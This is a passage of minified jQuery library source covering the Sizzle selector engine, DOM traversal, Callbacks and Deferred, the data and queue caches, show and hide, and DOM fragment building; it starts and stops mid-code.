(h, e, t, g, v) { var y = "nth" !== h.slice(0, 3), m = "last" !== h.slice(-4), x = "of-type" === e; return 1 === g && 0 === v ? function (e) { return !!e.parentNode } : function (e, t, n) { var r, i, o, a, s, u, l = y !== m ? "nextSibling" : "previousSibling", c = e.parentNode, f = x && e.nodeName.toLowerCase(), p = !n && !x, d = !1; if (c) { if (y) { while (l) { a = e; while (a = a[l]) if (x ? a.nodeName.toLowerCase() === f : 1 === a.nodeType) return !1; u = l = "only" === h && !u && "nextSibling" } return !0 } if (u = [m ? c.firstChild : c.lastChild], m && p) { d = (s = (r = (i = (o = (a = c)[k] || (a[k] = {}))[a.uniqueID] || (o[a.uniqueID] = {}))[h] || [])[0] === S && r[1]) && r[2], a = s && c.childNodes[s]; while (a = ++s && a && a[l] || (d = s = 0) || u.pop()) if (1 === a.nodeType && ++d && a === e) { i[h] = [S, s, d]; break } } else if (p && (d = s = (r = (i = (o = (a = e)[k] || (a[k] = {}))[a.uniqueID] || (o[a.uniqueID] = {}))[h] || [])[0] === S && r[1]), !1 === d) while (a = ++s && a && a[l] || (d = s = 0) || u.pop()) if ((x ? a.nodeName.toLowerCase() === f : 1 === a.nodeType) && ++d && (p && ((i = (o = a[k] || (a[k] = {}))[a.uniqueID] || (o[a.uniqueID] = {}))[h] = [S, d]), a === e)) break; return (d -= v) === g || d % g == 0 && 0 <= d / g } } }, PSEUDO: function (e, o) { var t, a = b.pseudos[e] || b.setFilters[e.toLowerCase()] || se.error("unsupported pseudo: " + e); return a[k] ? a(o) : 1 < a.length ? (t = [e, e, "", o], b.setFilters.hasOwnProperty(e.toLowerCase()) ? le(function (e, t) { var n, r = a(e, o), i = r.length; while (i--) e[n = P(e, r[i])] = !(t[n] = r[i]) }) : function (e) { return a(e, 0, t) }) : a } }, pseudos: { not: le(function (e) { var r = [], i = [], s = f(e.replace(B, "$1")); return s[k] ? le(function (e, t, n, r) { var i, o = s(e, null, r, []), a = e.length; while (a--) (i = o[a]) && (e[a] = !(t[a] = i)) }) : function (e, t, n) { return r[0] = e, s(r, null, n, i), r[0] = null, !i.pop() } }), has: le(function (t) { return function (e) { return 0 < se(t, e).length } }), contains: le(function (t) { return t = t.replace(te, ne), function (e) { return -1 < (e.textContent || o(e)).indexOf(t) } }), lang: le(function (n) { return V.test(n || "") || se.error("unsupported lang: " + n), n = n.replace(te, ne).toLowerCase(), function (e) { var t; do { if (t = E ? e.lang : e.getAttribute("xml:lang") || e.getAttribute("lang")) return (t = t.toLowerCase()) === n || 0 === t.indexOf(n + "-") } while ((e = e.parentNode) && 1 === e.nodeType); return !1 } }), target: function (e) { var t = n.location && n.location.hash; return t && t.slice(1) === e.id }, root: function (e) { return e === a }, focus: function (e) { return e === C.activeElement && (!C.hasFocus || C.hasFocus()) && !!(e.type || e.href || ~e.tabIndex) }, enabled: ge(!1), disabled: ge(!0), checked: function (e) { var t = e.nodeName.toLowerCase(); return "input" === t && !!e.checked || "option" === t && !!e.selected }, selected: function (e) { return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected }, empty: function (e) { for (e = e.firstChild; e; e = e.nextSibling)if (e.nodeType < 6) return !1; return !0 }, parent: function (e) { return !b.pseudos.empty(e) }, header: function (e) { return J.test(e.nodeName) }, input: function (e) { return Q.test(e.nodeName) }, button: function (e) { var t = e.nodeName.toLowerCase(); return "input" === t && "button" === e.type || "button" === t }, text: function (e) { var t; return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase()) }, first: ve(function () { return [0] }), last: ve(function (e, t) { return [t - 1] }), eq: ve(function (e, t, n) { return [n < 0 ? n + t : n] }), even: ve(function (e, t) { for (var n = 0; n < t; n += 2)e.push(n); return e }), odd: ve(function (e, t) { for (var n = 1; n < t; n += 2)e.push(n); return e }), lt: ve(function (e, t, n) { for (var r = n < 0 ? n + t : t < n ? t : n; 0 <= --r;)e.push(r); return e }), gt: ve(function (e, t, n) { for (var r = n < 0 ? n + t : n; ++r < t;)e.push(r); return e }) } }).pseudos.nth = b.pseudos.eq, { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }) b.pseudos[e] = de(e); for (e in { submit: !0, reset: !0 }) b.pseudos[e] = he(e); function me() { } function xe(e) { for (var t = 0, n = e.length, r = ""; t < n; t++)r += e[t].value; return r } function be(s, e, t) { var u = e.dir, l = e.next, c = l || u, f = t && "parentNode" === c, p = r++; return e.first ? function (e, t, n) { while (e = e[u]) if (1 === e.nodeType || f) return s(e, t, n); return !1 } : function (e, t, n) { var r, i, o, a = [S, p]; if (n) { while (e = e[u]) if ((1 === e.nodeType || f) && s(e, t, n)) return !0 } else while (e = e[u]) if (1 === e.nodeType || f) if (i = (o = e[k] || (e[k] = {}))[e.uniqueID] || (o[e.uniqueID] = {}), l && l === e.nodeName.toLowerCase()) e = e[u] || e; else { if ((r = i[c]) && r[0] === S && r[1] === p) return a[2] = r[2]; if ((i[c] = a)[2] = s(e, t, n)) return !0 } return !1 } } function we(i) { return 1 < i.length ? function (e, t, n) { var r = i.length; while (r--) if (!i[r](e, t, n)) return !1; return !0 } : i[0] } function Te(e, t, n, r, i) { for (var o, a = [], s = 0, u = e.length, l = null != t; s < u; s++)(o = e[s]) && (n && !n(o, r, i) || (a.push(o), l && t.push(s))); return a } function Ce(d, h, g, v, y, e) { return v && !v[k] && (v = Ce(v)), y && !y[k] && (y = Ce(y, e)), le(function (e, t, n, r) { var i, o, a, s = [], u = [], l = t.length, c = e || function (e, t, n) { for (var r = 0, i = t.length; r < i; r++)se(e, t[r], n); return n }(h || "*", n.nodeType ? [n] : n, []), f = !d || !e && h ? c : Te(c, s, d, n, r), p = g ? y || (e ? d : l || v) ? [] : t : f; if (g && g(f, p, n, r), v) { i = Te(p, u), v(i, [], n, r), o = i.length; while (o--) (a = i[o]) && (p[u[o]] = !(f[u[o]] = a)) } if (e) { if (y || d) { if (y) { i = [], o = p.length; while (o--) (a = p[o]) && i.push(f[o] = a); y(null, p = [], i, r) } o = p.length; while (o--) (a = p[o]) && -1 < (i = y ? P(e, a) : s[o]) && (e[i] = !(t[i] = a)) } } else p = Te(p === t ? p.splice(l, p.length) : p), y ? y(null, t, p, r) : H.apply(t, p) }) } function Ee(e) { for (var i, t, n, r = e.length, o = b.relative[e[0].type], a = o || b.relative[" "], s = o ? 1 : 0, u = be(function (e) { return e === i }, a, !0), l = be(function (e) { return -1 < P(i, e) }, a, !0), c = [function (e, t, n) { var r = !o && (n || t !== w) || ((i = t).nodeType ? u(e, t, n) : l(e, t, n)); return i = null, r }]; s < r; s++)if (t = b.relative[e[s].type]) c = [be(we(c), t)]; else { if ((t = b.filter[e[s].type].apply(null, e[s].matches))[k]) { for (n = ++s; n < r; n++)if (b.relative[e[n].type]) break; return Ce(1 < s && we(c), 1 < s && xe(e.slice(0, s - 1).concat({ value: " " === e[s - 2].type ? "*" : "" })).replace(B, "$1"), t, s < n && Ee(e.slice(s, n)), n < r && Ee(e = e.slice(n)), n < r && xe(e)) } c.push(t) } return we(c) } return me.prototype = b.filters = b.pseudos, b.setFilters = new me, h = se.tokenize = function (e, t) { var n, r, i, o, a, s, u, l = x[e + " "]; if (l) return t ? 0 : l.slice(0); a = e, s = [], u = b.preFilter; while (a) { for (o in n && !(r = _.exec(a)) || (r && (a = a.slice(r[0].length) || a), s.push(i = [])), n = !1, (r = z.exec(a)) && (n = r.shift(), i.push({ value: n, type: r[0].replace(B, " ") }), a = a.slice(n.length)), b.filter) !(r = G[o].exec(a)) || u[o] && !(r = u[o](r)) || (n = r.shift(), i.push({ value: n, type: o, matches: r }), a = a.slice(n.length)); if (!n) break } return t ? a.length : a ? se.error(e) : x(e, s).slice(0) }, f = se.compile = function (e, t) { var n, v, y, m, x, r, i = [], o = [], a = N[e + " "]; if (!a) { t || (t = h(e)), n = t.length; while (n--) (a = Ee(t[n]))[k] ? i.push(a) : o.push(a); (a = N(e, (v = o, m = 0 < (y = i).length, x = 0 < v.length, r = function (e, t, n, r, i) { var o, a, s, u = 0, l = "0", c = e && [], f = [], p = w, d = e || x && b.find.TAG("*", i), h = S += null == p ? 1 : Math.random() || .1, g = d.length; for (i && (w = t === C || t || i); l !== g && null != (o = d[l]); l++) { if (x && o) { a = 0, t || o.ownerDocument === C || (T(o), n = !E); while (s = v[a++]) if (s(o, t || C, n)) { r.push(o); break } i && (S = h) } m && ((o = !s && o) && u--, e && c.push(o)) } if (u += l, m && l !== u) { a = 0; while (s = y[a++]) s(c, f, t, n); if (e) { if (0 < u) while (l--) c[l] || f[l] || (f[l] = q.call(r)); f = Te(f) } H.apply(r, f), i && !e && 0 < f.length && 1 < u + y.length && se.uniqueSort(r) } return i && (S = h, w = p), c }, m ? le(r) : r))).selector = e } return a }, g = se.select = function (e, t, n, r) { var i, o, a, s, u, l = "function" == typeof e && e, c = !r && h(e = l.selector || e); if (n = n || [], 1 === c.length) { if (2 < (o = c[0] = c[0].slice(0)).length && "ID" === (a = o[0]).type && 9 === t.nodeType && E && b.relative[o[1].type]) { if (!(t = (b.find.ID(a.matches[0].replace(te, ne), t) || [])[0])) return n; l && (t = t.parentNode), e = e.slice(o.shift().value.length) } i = G.needsContext.test(e) ? 0 : o.length; while (i--) { if (a = o[i], b.relative[s = a.type]) break; if ((u = b.find[s]) && (r = u(a.matches[0].replace(te, ne), ee.test(o[0].type) && ye(t.parentNode) || t))) { if (o.splice(i, 1), !(e = r.length && xe(o))) return H.apply(n, r), n; break } } } return (l || f(e, c))(r, t, !E, n, !t || ee.test(e) && ye(t.parentNode) || t), n }, d.sortStable = k.split("").sort(D).join("") === k, d.detectDuplicates = !!l, T(), d.sortDetached = ce(function (e) { return 1 & e.compareDocumentPosition(C.createElement("fieldset")) }), ce(function (e) { return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href") }) || fe("type|href|height|width", function (e, t, n) { if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2) }), d.attributes && ce(function (e) { return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value") }) || fe("value", function (e, t, n) { if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue }), ce(function (e) { return null == e.getAttribute("disabled") }) || fe(R, function (e, t, n) { var r; if (!n) return !0 === e[t] ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null }), se }(C); k.find = h, k.expr = h.selectors, k.expr[":"] = k.expr.pseudos, k.uniqueSort = k.unique = h.uniqueSort, k.text = h.getText, k.isXMLDoc = h.isXML, k.contains = h.contains, k.escapeSelector = h.escape; var T = function (e, t, n) { var r = [], i = void 0 !== n; while ((e = e[t]) && 9 !== e.nodeType) if (1 === e.nodeType) { if (i && k(e).is(n)) break; r.push(e) } return r }, S = function (e, t) { for (var n = []; e; e = e.nextSibling)1 === e.nodeType && e !== t && n.push(e); return n }, N = k.expr.match.needsContext; function A(e, t) { return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase() } var D = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i; function j(e, n, r) { return m(n) ? k.grep(e, function (e, t) { return !!n.call(e, t, e) !== r }) : n.nodeType ? k.grep(e, function (e) { return e === n !== r }) : "string" != typeof n ? k.grep(e, function (e) { return -1 < i.call(n, e) !== r }) : k.filter(n, e, r) } k.filter = function (e, t, n) { var r = t[0]; return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === r.nodeType ? k.find.matchesSelector(r, e) ? [r] : [] : k.find.matches(e, k.grep(t, function (e) { return 1 === e.nodeType })) }, k.fn.extend({ find: function (e) { var t, n, r = this.length, i = this; if ("string" != typeof e) return this.pushStack(k(e).filter(function () { for (t = 0; t < r; t++)if (k.contains(i[t], this)) return !0 })); for (n = this.pushStack([]), t = 0; t < r; t++)k.find(e, i[t], n); return 1 < r ? k.uniqueSort(n) : n }, filter: function (e) { return this.pushStack(j(this, e || [], !1)) }, not: function (e) { return this.pushStack(j(this, e || [], !0)) }, is: function (e) { return !!j(this, "string" == typeof e && N.test(e) ? k(e) : e || [], !1).length } }); var q, L = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/; (k.fn.init = function (e, t, n) { var r, i; if (!e) return this; if (n = n || q, "string" == typeof e) { if (!(r = "<" === e[0] && ">" === e[e.length - 1] && 3 <= e.length ? [null, e, null] : L.exec(e)) || !r[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e); if (r[1]) { if (t = t instanceof k ? t[0] : t, k.merge(this, k.parseHTML(r[1], t && t.nodeType ? t.ownerDocument || t : E, !0)), D.test(r[1]) && k.isPlainObject(t)) for (r in t) m(this[r]) ? this[r](t[r]) : this.attr(r, t[r]); return this } return (i = E.getElementById(r[2])) && (this[0] = i, this.length = 1), this } return e.nodeType ? (this[0] = e, this.length = 1, this) : m(e) ? void 0 !== n.ready ? n.ready(e) : e(k) : k.makeArray(e, this) }).prototype = k.fn, q = k(E); var H = /^(?:parents|prev(?:Until|All))/, O = { children: !0, contents: !0, next: !0, prev: !0 }; function P(e, t) { while ((e = e[t]) && 1 !== e.nodeType); return e } k.fn.extend({ has: function (e) { var t = k(e, this), n = t.length; return this.filter(function () { for (var e = 0; e < n; e++)if (k.contains(this, t[e])) return !0 }) }, closest: function (e, t) { var n, r = 0, i = this.length, o = [], a = "string" != typeof e && k(e); if (!N.test(e)) for (; r < i; r++)for (n = this[r]; n && n !== t; n = n.parentNode)if (n.nodeType < 11 && (a ? -1 < a.index(n) : 1 === n.nodeType && k.find.matchesSelector(n, e))) { o.push(n); break } return this.pushStack(1 < o.length ? k.uniqueSort(o) : o) }, index: function (e) { return e ? "string" == typeof e ? i.call(k(e), this[0]) : i.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1 }, add: function (e, t) { return this.pushStack(k.uniqueSort(k.merge(this.get(), k(e, t)))) }, addBack: function (e) { return this.add(null == e ? this.prevObject : this.prevObject.filter(e)) } }), k.each({ parent: function (e) { var t = e.parentNode; return t && 11 !== t.nodeType ? t : null }, parents: function (e) { return T(e, "parentNode") }, parentsUntil: function (e, t, n) { return T(e, "parentNode", n) }, next: function (e) { return P(e, "nextSibling") }, prev: function (e) { return P(e, "previousSibling") }, nextAll: function (e) { return T(e, "nextSibling") }, prevAll: function (e) { return T(e, "previousSibling") }, nextUntil: function (e, t, n) { return T(e, "nextSibling", n) }, prevUntil: function (e, t, n) { return T(e, "previousSibling", n) }, siblings: function (e) { return S((e.parentNode || {}).firstChild, e) }, children: function (e) { return S(e.firstChild) }, contents: function (e) { return "undefined" != typeof e.contentDocument ? e.contentDocument : (A(e, "template") && (e = e.content || e), k.merge([], e.childNodes)) } }, function (r, i) { k.fn[r] = function (e, t) { var n = k.map(this, i, e); return "Until" !== r.slice(-5) && (t = e), t && "string" == typeof t && (n = k.filter(t, n)), 1 < this.length && (O[r] || k.uniqueSort(n), H.test(r) && n.reverse()), this.pushStack(n) } }); var R = /[^\x20\t\r\n\f]+/g; function M(e) { return e } function I(e) { throw e } function W(e, t, n, r) { var i; try { e && m(i = e.promise) ? i.call(e).done(t).fail(n) : e && m(i = e.then) ? i.call(e, t, n) : t.apply(void 0, [e].slice(r)) } catch (e) { n.apply(void 0, [e]) } } k.Callbacks = function (r) { var e, n; r = "string" == typeof r ? (e = r, n = {}, k.each(e.match(R) || [], function (e, t) { n[t] = !0 }), n) : k.extend({}, r); var i, t, o, a, s = [], u = [], l = -1, c = function () { for (a = a || r.once, o = i = !0; u.length; l = -1) { t = u.shift(); while (++l < s.length) !1 === s[l].apply(t[0], t[1]) && r.stopOnFalse && (l = s.length, t = !1) } r.memory || (t = !1), i = !1, a && (s = t ? [] : "") }, f = { add: function () { return s && (t && !i && (l = s.length - 1, u.push(t)), function n(e) { k.each(e, function (e, t) { m(t) ? r.unique && f.has(t) || s.push(t) : t && t.length && "string" !== w(t) && n(t) }) }(arguments), t && !i && c()), this }, remove: function () { return k.each(arguments, function (e, t) { var n; while (-1 < (n = k.inArray(t, s, n))) s.splice(n, 1), n <= l && l-- }), this }, has: function (e) { return e ? -1 < k.inArray(e, s) : 0 < s.length }, empty: function () { return s && (s = []), this }, disable: function () { return a = u = [], s = t = "", this }, disabled: function () { return !s }, lock: function () { return a = u = [], t || i || (s = t = ""), this }, locked: function () { return !!a }, fireWith: function (e, t) { return a || (t = [e, (t = t || []).slice ? t.slice() : t], u.push(t), i || c()), this }, fire: function () { return f.fireWith(this, arguments), this }, fired: function () { return !!o } }; return f }, k.extend({ Deferred: function (e) { var o = [["notify", "progress", k.Callbacks("memory"), k.Callbacks("memory"), 2], ["resolve", "done", k.Callbacks("once memory"), k.Callbacks("once memory"), 0, "resolved"], ["reject", "fail", k.Callbacks("once memory"), k.Callbacks("once memory"), 1, "rejected"]], i = "pending", a = { state: function () { return i }, always: function () { return s.done(arguments).fail(arguments), this }, "catch": function (e) { return a.then(null, e) }, pipe: function () { var i = arguments; return k.Deferred(function (r) { k.each(o, function (e, t) { var n = m(i[t[4]]) && i[t[4]]; s[t[1]](function () { var e = n && n.apply(this, arguments); e && m(e.promise) ? e.promise().progress(r.notify).done(r.resolve).fail(r.reject) : r[t[0] + "With"](this, n ? [e] : arguments) }) }), i = null }).promise() }, then: function (t, n, r) { var u = 0; function l(i, o, a, s) { return function () { var n = this, r = arguments, e = function () { var e, t; if (!(i < u)) { if ((e = a.apply(n, r)) === o.promise()) throw new TypeError("Thenable self-resolution"); t = e && ("object" == typeof e || "function" == typeof e) && e.then, m(t) ? s ? t.call(e, l(u, o, M, s), l(u, o, I, s)) : (u++, t.call(e, l(u, o, M, s), l(u, o, I, s), l(u, o, M, o.notifyWith))) : (a !== M && (n = void 0, r = [e]), (s || o.resolveWith)(n, r)) } }, t = s ? e : function () { try { e() } catch (e) { k.Deferred.exceptionHook && k.Deferred.exceptionHook(e, t.stackTrace), u <= i + 1 && (a !== I && (n = void 0, r = [e]), o.rejectWith(n, r)) } }; i ? t() : (k.Deferred.getStackHook && (t.stackTrace = k.Deferred.getStackHook()), C.setTimeout(t)) } } return k.Deferred(function (e) { o[0][3].add(l(0, e, m(r) ? r : M, e.notifyWith)), o[1][3].add(l(0, e, m(t) ? t : M)), o[2][3].add(l(0, e, m(n) ? n : I)) }).promise() }, promise: function (e) { return null != e ? k.extend(e, a) : a } }, s = {}; return k.each(o, function (e, t) { var n = t[2], r = t[5]; a[t[1]] = n.add, r && n.add(function () { i = r }, o[3 - e][2].disable, o[3 - e][3].disable, o[0][2].lock, o[0][3].lock), n.add(t[3].fire), s[t[0]] = function () { return s[t[0] + "With"](this === s ? void 0 : this, arguments), this }, s[t[0] + "With"] = n.fireWith }), a.promise(s), e && e.call(s, s), s }, when: function (e) { var n = arguments.length, t = n, r = Array(t), i = s.call(arguments), o = k.Deferred(), a = function (t) { return function (e) { r[t] = this, i[t] = 1 < arguments.length ? s.call(arguments) : e, --n || o.resolveWith(r, i) } }; if (n <= 1 && (W(e, o.done(a(t)).resolve, o.reject, !n), "pending" === o.state() || m(i[t] && i[t].then))) return o.then(); while (t--) W(i[t], a(t), o.reject); return o.promise() } }); var $ = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/; k.Deferred.exceptionHook = function (e, t) { C.console && C.console.warn && e && $.test(e.name) && C.console.warn("jQuery.Deferred exception: " + e.message, e.stack, t) }, k.readyException = function (e) { C.setTimeout(function () { throw e }) }; var F = k.Deferred(); function B() { E.removeEventListener("DOMContentLoaded", B), C.removeEventListener("load", B), k.ready() } k.fn.ready = function (e) { return F.then(e)["catch"](function (e) { k.readyException(e) }), this }, k.extend({ isReady: !1, readyWait: 1, ready: function (e) { (!0 === e ? --k.readyWait : k.isReady) || (k.isReady = !0) !== e && 0 < --k.readyWait || F.resolveWith(E, [k]) } }), k.ready.then = F.then, "complete" === E.readyState || "loading" !== E.readyState && !E.documentElement.doScroll ? C.setTimeout(k.ready) : (E.addEventListener("DOMContentLoaded", B), C.addEventListener("load", B)); var _ = function (e, t, n, r, i, o, a) { var s = 0, u = e.length, l = null == n; if ("object" === w(n)) for (s in i = !0, n) _(e, t, s, n[s], !0, o, a); else if (void 0 !== r && (i = !0, m(r) || (a = !0), l && (a ? (t.call(e, r), t = null) : (l = t, t = function (e, t, n) { return l.call(k(e), n) })), t)) for (; s < u; s++)t(e[s], n, a ? r : r.call(e[s], s, t(e[s], n))); return i ? e : l ? t.call(e) : u ? t(e[0], n) : o }, z = /^-ms-/, U = /-([a-z])/g; function X(e, t) { return t.toUpperCase() } function V(e) { return e.replace(z, "ms-").replace(U, X) } var G = function (e) { return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType }; function Y() { this.expando = k.expando + Y.uid++ } Y.uid = 1, Y.prototype = { cache: function (e) { var t = e[this.expando]; return t || (t = {}, G(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, { value: t, configurable: !0 }))), t }, set: function (e, t, n) { var r, i = this.cache(e); if ("string" == typeof t) i[V(t)] = n; else for (r in t) i[V(r)] = t[r]; return i }, get: function (e, t) { return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][V(t)] }, access: function (e, t, n) { return void 0 === t || t && "string" == typeof t && void 0 === n ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t) }, remove: function (e, t) { var n, r = e[this.expando]; if (void 0 !== r) { if (void 0 !== t) { n = (t = Array.isArray(t) ? t.map(V) : (t = V(t)) in r ? [t] : t.match(R) || []).length; while (n--) delete r[t[n]] } (void 0 === t || k.isEmptyObject(r)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando]) } }, hasData: function (e) { var t = e[this.expando]; return void 0 !== t && !k.isEmptyObject(t) } }; var Q = new Y, J = new Y, K = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/, Z = /[A-Z]/g; function ee(e, t, n) { var r, i; if (void 0 === n && 1 === e.nodeType) if (r = "data-" + t.replace(Z, "-$&").toLowerCase(), "string" == typeof (n = e.getAttribute(r))) { try { n = "true" === (i = n) || "false" !== i && ("null" === i ? null : i === +i + "" ? +i : K.test(i) ? JSON.parse(i) : i) } catch (e) { } J.set(e, t, n) } else n = void 0; return n } k.extend({ hasData: function (e) { return J.hasData(e) || Q.hasData(e) }, data: function (e, t, n) { return J.access(e, t, n) }, removeData: function (e, t) { J.remove(e, t) }, _data: function (e, t, n) { return Q.access(e, t, n) }, _removeData: function (e, t) { Q.remove(e, t) } }), k.fn.extend({ data: function (n, e) { var t, r, i, o = this[0], a = o && o.attributes; if (void 0 === n) { if (this.length && (i = J.get(o), 1 === o.nodeType && !Q.get(o, "hasDataAttrs"))) { t = a.length; while (t--) a[t] && 0 === (r = a[t].name).indexOf("data-") && (r = V(r.slice(5)), ee(o, r, i[r])); Q.set(o, "hasDataAttrs", !0) } return i } return "object" == typeof n ? this.each(function () { J.set(this, n) }) : _(this, function (e) { var t; if (o && void 0 === e) return void 0 !== (t = J.get(o, n)) ? t : void 0 !== (t = ee(o, n)) ? t : void 0; this.each(function () { J.set(this, n, e) }) }, null, e, 1 < arguments.length, null, !0) }, removeData: function (e) { return this.each(function () { J.remove(this, e) }) } }), k.extend({ queue: function (e, t, n) { var r; if (e) return t = (t || "fx") + "queue", r = Q.get(e, t), n && (!r || Array.isArray(n) ? r = Q.access(e, t, k.makeArray(n)) : r.push(n)), r || [] }, dequeue: function (e, t) { t = t || "fx"; var n = k.queue(e, t), r = n.length, i = n.shift(), o = k._queueHooks(e, t); "inprogress" === i && (i = n.shift(), r--), i && ("fx" === t && n.unshift("inprogress"), delete o.stop, i.call(e, function () { k.dequeue(e, t) }, o)), !r && o && o.empty.fire() }, _queueHooks: function (e, t) { var n = t + "queueHooks"; return Q.get(e, n) || Q.access(e, n, { empty: k.Callbacks("once memory").add(function () { Q.remove(e, [t + "queue", n]) }) }) } }), k.fn.extend({ queue: function (t, n) { var e = 2; return "string" != typeof t && (n = t, t = "fx", e--), arguments.length < e ? k.queue(this[0], t) : void 0 === n ? this : this.each(function () { var e = k.queue(this, t, n); k._queueHooks(this, t), "fx" === t && "inprogress" !== e[0] && k.dequeue(this, t) }) }, dequeue: function (e) { return this.each(function () { k.dequeue(this, e) }) }, clearQueue: function (e) { return this.queue(e || "fx", []) }, promise: function (e, t) { var n, r = 1, i = k.Deferred(), o = this, a = this.length, s = function () { --r || i.resolveWith(o, [o]) }; "string" != typeof e && (t = e, e = void 0), e = e || "fx"; while (a--) (n = Q.get(o[a], e + "queueHooks")) && n.empty && (r++, n.empty.add(s)); return s(), i.promise(t) } }); var te = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source, ne = new RegExp("^(?:([+-])=|)(" + te + ")([a-z%]*)$", "i"), re = ["Top", "Right", "Bottom", "Left"], ie = E.documentElement, oe = function (e) { return k.contains(e.ownerDocument, e) }, ae = { composed: !0 }; ie.getRootNode && (oe = function (e) { return k.contains(e.ownerDocument, e) || e.getRootNode(ae) === e.ownerDocument }); var se = function (e, t) { return "none" === (e = t || e).style.display || "" === e.style.display && oe(e) && "none" === k.css(e, "display") }, ue = function (e, t, n, r) { var i, o, a = {}; for (o in t) a[o] = e.style[o], e.style[o] = t[o]; for (o in i = n.apply(e, r || []), t) e.style[o] = a[o]; return i }; function le(e, t, n, r) { var i, o, a = 20, s = r ? function () { return r.cur() } : function () { return k.css(e, t, "") }, u = s(), l = n && n[3] || (k.cssNumber[t] ? "" : "px"), c = e.nodeType && (k.cssNumber[t] || "px" !== l && +u) && ne.exec(k.css(e, t)); if (c && c[3] !== l) { u /= 2, l = l || c[3], c = +u || 1; while (a--) k.style(e, t, c + l), (1 - o) * (1 - (o = s() / u || .5)) <= 0 && (a = 0), c /= o; c *= 2, k.style(e, t, c + l), n = n || [] } return n && (c = +c || +u || 0, i = n[1] ? c + (n[1] + 1) * n[2] : +n[2], r && (r.unit = l, r.start = c, r.end = i)), i } var ce = {}; function fe(e, t) { for (var n, r, i, o, a, s, u, l = [], c = 0, f = e.length; c < f; c++)(r = e[c]).style && (n = r.style.display, t ? ("none" === n && (l[c] = Q.get(r, "display") || null, l[c] || (r.style.display = "")), "" === r.style.display && se(r) && (l[c] = (u = a = o = void 0, a = (i = r).ownerDocument, s = i.nodeName, (u = ce[s]) || (o = a.body.appendChild(a.createElement(s)), u = k.css(o, "display"), o.parentNode.removeChild(o), "none" === u && (u = "block"), ce[s] = u)))) : "none" !== n && (l[c] = "none", Q.set(r, "display", n))); for (c = 0; c < f; c++)null != l[c] && (e[c].style.display = l[c]); return e } k.fn.extend({ show: function () { return fe(this, !0) }, hide: function () { return fe(this) }, toggle: function (e) { return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function () { se(this) ? k(this).show() : k(this).hide() }) } }); var pe = /^(?:checkbox|radio)$/i, de = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i, he = /^$|^module$|\/(?:java|ecma)script/i, ge = { option: [1, "<select multiple='multiple'>", "</select>"], thead: [1, "<table>", "</table>"], col: [2, "<table><colgroup>", "</colgroup></table>"], tr: [2, "<table><tbody>", "</tbody></table>"], td: [3, "<table><tbody><tr>", "</tr></tbody></table>"], _default: [0, "", ""] }; function ve(e, t) { var n; return n = "undefined" != typeof e.getElementsByTagName ? e.getElementsByTagName(t || "*") : "undefined" != typeof e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && A(e, t) ? k.merge([e], n) : n } function ye(e, t) { for (var n = 0, r = e.length; n < r; n++)Q.set(e[n], "globalEval", !t || Q.get(t[n], "globalEval")) } ge.optgroup = ge.option, ge.tbody = ge.tfoot = ge.colgroup = ge.caption = ge.thead, ge.th = ge.td; var me, xe, be = /<|&#?\w+;/; function we(e, t, n, r, i) { for (var o, a, s, u, l, c, f = t.createDocumentFragment(), p = [], d = 0, h = e.length; d < h; d++)if ((o = e[d]) || 0 === o) if ("object" === w(o)) k.merge(p, o.nodeType ? [o] : o); else if (be.test(o)) { a = a || f.appendChild(t.createElement("div")), s = (de.exec(o) || ["", ""])[1].toLowerCase(), u = ge[s] || ge._default, a.innerHTML = u[1] + k.htmlPrefilter(o) + u[2], c = u[0]; while (c--) a = a.lastChild; k.merge(p, a.childNodes), (a = f.firstChild).textContent = "" } else p.push(t.createTextNode(o)); f.textContent = "", d = 0; while (o = p[d++]) if (r && -1 < k.inArray(o, r)) i && i.push(o); else if (l = oe(o), a = ve(f.appendChild(o), "script"), l && ye(a), n) { c = 0; while (o = a[c++]) he.test(o.type || "") && n.push(o) } return f } me = E.createDocumentFragment().appendChild(E.createElement("div")), (xe = E.createElement("input")).setAttribute("type", "radio"), xe.setAttribute("checked", "checked"), xe.setAttribute("name", "t"), me.appendChild(xe), y.checkClone = me.cloneNode(!0).cloneNode(!0).lastChild.checked, me.innerHTML = "<textarea>x</textarea>", y.noCloneChecked = !!me.cloneNode(!0).lastChild.defaultValue; var Te = /^key/, Ce = /^(?:mouse|pointer|contextmenu|drag|drop)|click/, Ee = /^([^.]*)(?:\.(.+)|)/; function ke() { return !0 } function Se() { return !1 } function Ne(e, t) { return e === function () { try { return E.activeElement } catch (e) { } }() == ("focus" === t) } function Ae(e, t, n, r, i, o) { var a, s; if ("object" == typeof t) { for (s in "string" != typeof n && (r = r || n, n = void 0), t) Ae(e, s, n, r, t[s], o); return e } if (null == r && null == i ? (i = n, r = n = void 0) : null == i && ("string" == typeof n ? (i = r, r = void 0) : (i = r, r = n, n = void 0)), !1 === i) i = Se; else if (!i) return e; return 1 === o && (a = i, (i = function (e) { return k().off(e), a.apply(this, arguments) }).guid = a.guid || (a.guid = k.guid++)), e.each(function () { k.event.add(this, 